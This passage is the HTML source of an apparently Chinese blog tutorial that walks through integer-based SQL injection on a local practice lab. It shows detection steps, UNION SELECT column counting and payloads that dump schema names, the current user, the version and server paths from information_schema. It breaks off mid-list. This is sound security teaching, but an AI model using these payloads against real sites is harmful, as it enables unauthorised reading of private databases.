&lt;h2 id=&#34;SQL注入步骤&#34;&gt;&lt;a href=&#34;#SQL注入步骤&#34; class=&#34;headerlink&#34; title=&#34;SQL注入步骤&#34;&gt;&lt;/a&gt;SQL注入步骤&lt;/h2&gt;&lt;h3 id=&#34;①判断是否有注入-判断是否未严格校验&#34;&gt;&lt;a href=&#34;#①判断是否有注入-判断是否未严格校验&#34; class=&#34;headerlink&#34; title=&#34;①判断是否有注入(判断是否未严格校验)&#34;&gt;&lt;/a&gt;①判断是否有注入(判断是否未严格校验)&lt;/h3&gt;&lt;h4 id=&#34;1-可控参数的改变能否影响页面的显示结果&#34;&gt;&lt;a href=&#34;#1-可控参数的改变能否影响页面的显示结果&#34; class=&#34;headerlink&#34; title=&#34;1)可控参数的改变能否影响页面的显示结果&#34;&gt;&lt;/a&gt;1)可控参数的改变能否影响页面的显示结果&lt;/h4&gt;&lt;p&gt;网页让输入id，可是我们并没有看到交互框，因此猜测有可能是需要发送请求。&lt;/p&gt;
&lt;p&gt;点击查看网页源代码，在Network这里看到是GET请求。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928213756712.png&#34; alt=&#34;image-20220928213756712&#34;&gt;&lt;/p&gt;
&lt;p&gt;因此我们选择在链接后面加上id参数&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928213510534.png&#34; alt=&#34;image-20220928213510534&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现成功令其输出内容。&lt;/p&gt;
&lt;p&gt;此时我们再次改变GET请求中id的值，发现，内容会对应有所变化。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928214022889.png&#34; alt=&#34;image-20220928214022889&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;2-输入的SQL语句是否能报错&#34;&gt;&lt;a href=&#34;#2-输入的SQL语句是否能报错&#34; class=&#34;headerlink&#34; title=&#34;2)输入的SQL语句是否能报错&#34;&gt;&lt;/a&gt;2)输入的SQL语句是否能报错&lt;/h4&gt;&lt;p&gt;因为能通过数据库的报错，看到数据库的一些语句痕迹&lt;/p&gt;
&lt;p&gt;我们假设它后台的查询语句是&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; $id&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;猜想：能否通过加单引号令其出错？&lt;/p&gt;
&lt;p&gt;因为：&lt;/p&gt;
&lt;p&gt;如果是整型注入漏洞，则像3’这样的字符传入$id处会引发错误。&lt;/p&gt;
&lt;p&gt;如果是单引号注入漏洞，像3’这样的字符传入$id处也会引发错误。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928214501924.png&#34; alt=&#34;image-20220928214501924&#34;&gt;&lt;/p&gt;
&lt;p&gt;黄字部分的报错语句，非常之重要！&lt;/p&gt;
&lt;p&gt;near ‘xxxxxxxxxx’ at line 1 是在告诉我们在第1行的xxxxxxx语句处出现错误，而我们通过加入单引号使其发生错误，错误信息就会帮我们显示了出错的局部代码，也就是“输出了单引号后面的语句”——LIMIT 0,1。&lt;/p&gt;
&lt;p&gt;为了再次确定near ‘xxxxxxxxxx’ at line 1中在LIMIT 0,1之前的一个单引号是我们输入的单引号，我们再次改变GET请求中” ‘ ‘“（单引号）变为” “ “（双引号）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928215359897.png&#34; alt=&#34;image-20220928215359897&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现成功令报错信息中near ‘xxxxx’中的LIMIT前一个符号发生改变。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#如果是整型注入，加入单引号会报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; limit 0,1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#如果是单引号注入，加入单引号也会报错&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;select username,password from user where id = &amp;#x27;&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt; limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;据目前输入的结果来看，此网页存在“整型注入”或者“单引号注入”&lt;/p&gt;
&lt;h4 id=&#34;3-输入的SQL语句能否不报错&#34;&gt;&lt;a href=&#34;#3-输入的SQL语句能否不报错&#34; class=&#34;headerlink&#34; title=&#34;3)输入的SQL语句能否不报错&#34;&gt;&lt;/a&gt;3)输入的SQL语句能否不报错&lt;/h4&gt;&lt;p&gt;为了查看我们的语句能够成功闭合&lt;/p&gt;
&lt;p&gt;那怎么区分到底是整型还是单引号呢？&lt;/p&gt;
&lt;p&gt;使用 # 来注释后面语句&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#加入#号后，两个语法依旧错误，故都会报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; # limit 0,1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;select username,password from user where id = &amp;#x27;&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; #&amp;#x27;&lt;/span&gt; limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;结果确实是报错。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928220327744.png&#34; alt=&#34;image-20220928220327744&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来我们删掉单引号&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#如果是整型注入，则删掉单引号，保留#号后，不会报错！&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; # limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#如果是单引号注入，则删掉单引号，保留#号后，依旧会报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;2 #&amp;#x27;&lt;/span&gt; limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928220529170.png&#34; alt=&#34;image-20220928220529170&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;②什么类型的注入&#34;&gt;&lt;a href=&#34;#②什么类型的注入&#34; class=&#34;headerlink&#34; title=&#34;②什么类型的注入&#34;&gt;&lt;/a&gt;②什么类型的注入&lt;/h3&gt;&lt;p&gt;因此，此处经过上述报错信息确定，存在&lt;strong&gt;整型注入&lt;/strong&gt;！&lt;/p&gt;
&lt;h3 id=&#34;③语句是否能够被恶意修改&#34;&gt;&lt;a href=&#34;#③语句是否能够被恶意修改&#34; class=&#34;headerlink&#34; title=&#34;③语句是否能够被恶意修改&#34;&gt;&lt;/a&gt;③语句是否能够被恶意修改&lt;/h3&gt;&lt;p&gt;恶意修改主要指能否再加入一些我们想要的判断条件，比如：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;# limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果是整型注入无误，这里条件为“id = 2 and 0”——这是永假条件，则不会有任何查询结果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928221547372.png&#34; alt=&#34;image-20220928221547372&#34;&gt;&lt;/p&gt;
&lt;p&gt;结果正如我们所料，空空如也。&lt;/p&gt;
&lt;h3 id=&#34;④是否能够成功执行&#34;&gt;&lt;a href=&#34;#④是否能够成功执行&#34; class=&#34;headerlink&#34; title=&#34;④是否能够成功执行&#34;&gt;&lt;/a&gt;④是否能够成功执行&lt;/h3&gt;&lt;p&gt;第三个能满足，其实第四个就顺带就OK。&lt;/p&gt;
&lt;h3 id=&#34;⑤获取我们想要的数据&#34;&gt;&lt;a href=&#34;#⑤获取我们想要的数据&#34; class=&#34;headerlink&#34; title=&#34;⑤获取我们想要的数据&#34;&gt;&lt;/a&gt;⑤获取我们想要的数据&lt;/h3&gt;&lt;p&gt;关键数据是保存在数据库里面的，关系如下：&lt;/p&gt;
&lt;p&gt;数据库-&amp;gt;表-&amp;gt;字段-&amp;gt;值&lt;/p&gt;
&lt;p&gt;打开MySQL，我们可以看到其中有information_schema库（这是MySQL自带的库，管理所有表信息）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928223622076.png&#34; alt=&#34;image-20220928223622076&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个库中有三个表非常值得我们关注：&lt;/p&gt;
&lt;p&gt;Schemata表（包含所有的&lt;code&gt;库名信息&lt;/code&gt;）、Tables表（包含所有的&lt;code&gt;表名信息&lt;/code&gt;）、Columns表（包含所有的&lt;code&gt;列名信息&lt;/code&gt;）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;首先是Schemeta表&lt;/strong&gt;，&lt;code&gt;schema_name&lt;/code&gt;对应着所有数据库的名字。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928224006640.png&#34; alt=&#34;image-20220928224006640&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;其次是Tables表&lt;/strong&gt;，&lt;code&gt;table_name&lt;/code&gt;这个列里，存储了&lt;code&gt;table_schema对应的库&lt;/code&gt;下面的所有表&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928224135720.png&#34; alt=&#34;image-20220928224135720&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最后是Columns表&lt;/strong&gt;，通过&lt;code&gt;table_schema&lt;/code&gt;对应的库，&lt;code&gt;table_name&lt;/code&gt;对应的表，&lt;strong&gt;使用column_name对应的列名，来唯一地定位某个列&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928224405698.png&#34; alt=&#34;image-20220928224405698&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;1）构造联合查询&#34;&gt;&lt;a href=&#34;#1）构造联合查询&#34; class=&#34;headerlink&#34; title=&#34;1）构造联合查询&#34;&gt;&lt;/a&gt;1）构造联合查询&lt;/h4&gt;&lt;p&gt;确定的整型注入中，我们需要构造出我们想要的查询内容，比如在&lt;strong&gt;information_schema库&lt;/strong&gt;的&lt;strong&gt;Schema表&lt;/strong&gt;中获取&lt;code&gt;schema_name&lt;/code&gt;：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225341595.png&#34; alt=&#34;image-20220928225341595&#34;&gt;&lt;/p&gt;
&lt;p&gt;但如果像上面这样构造，会报错，我们需要使用到联合查询。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225106827.png&#34; alt=&#34;image-20220928225106827&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是，如果像上面这样构造，依旧会报错，在SQL查询中，union前后的两个列++&lt;strong&gt;需要列数完全一致才可拼接&lt;/strong&gt;++。&lt;/p&gt;
&lt;p&gt;因此，需要使用占位符来定位前面的查询是多少列：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#占位一个，后面的代码用#注释掉&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#占位两个，后面的代码用#注释掉&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#占位三个，后面的代码用#注释掉&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;....&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意，这里的1,2,3可以填任何数字或者符号，仅仅为了占位使用，&lt;strong&gt;可以被任意“想要看到的输出内容”覆盖&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;经过多次定位，我们最终得到：&lt;strong&gt;前面的查询&lt;/strong&gt;使用到的是&lt;strong&gt;3个列&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225313035.png&#34; alt=&#34;image-20220928225313035&#34;&gt;&lt;/p&gt;
&lt;p&gt;因此有：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225608030.png&#34; alt=&#34;image-20220928225608030&#34;&gt;&lt;/p&gt;
&lt;p&gt;虽然正确显示，但是我们查询的内容并没有显示出来。这是因为，使用union查询，&lt;strong&gt;还有个bug&lt;/strong&gt;就是如果前面的查询有效，&lt;strong&gt;最终结果会在前面查询到的结尾后面拼接&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;为了让后面查询到的内容（我们&lt;code&gt;想要看到的数据&lt;/code&gt;）提前，&lt;strong&gt;我们需要令前面的查询失效&lt;/strong&gt;，简单的方法就是令id = 39888 这样平常不会使用的奇怪数字：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225926603.png&#34; alt=&#34;image-20220928225926603&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;2）拼接多组内容在同一行输出、寻找所在库&#34;&gt;&lt;a href=&#34;#2）拼接多组内容在同一行输出、寻找所在库&#34; class=&#34;headerlink&#34; title=&#34;2）拼接多组内容在同一行输出、寻找所在库&#34;&gt;&lt;/a&gt;2）拼接多组内容在同一行输出、寻找所在库&lt;/h4&gt;&lt;p&gt;OK，我们在第二个占位符（也就是数字2所在的位置）上，看到输出了一个schema_name，但是我们想要输出所有的schema_name，怎么办？&lt;/p&gt;
&lt;p&gt;使用MySQL 查询语句提供的group_concat()函数&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(schema_name), schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到，原本占位符2所在的位置，已经被一组输出内容所替换。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928230746841.png&#34; alt=&#34;image-20220928230746841&#34;&gt;&lt;/p&gt;
&lt;p&gt;除了group_concat()，我们还可以使用：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#输出当前使用数据库的名称&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;database() &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#输出当前服务器中使用数据库的用户的名字和其对应的主机&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#输出当前数据库版本号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;version()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#输出该服务器数据库安装路径（数据库安装在哪里）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@&lt;span class=&#34;variable&#34;&gt;@basedir&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#输出数据库中数据的存放路径（该存放路径下有各个数据库的数据、数据库中表的数据）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@&lt;span class=&#34;variable&#34;&gt;@datadir&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 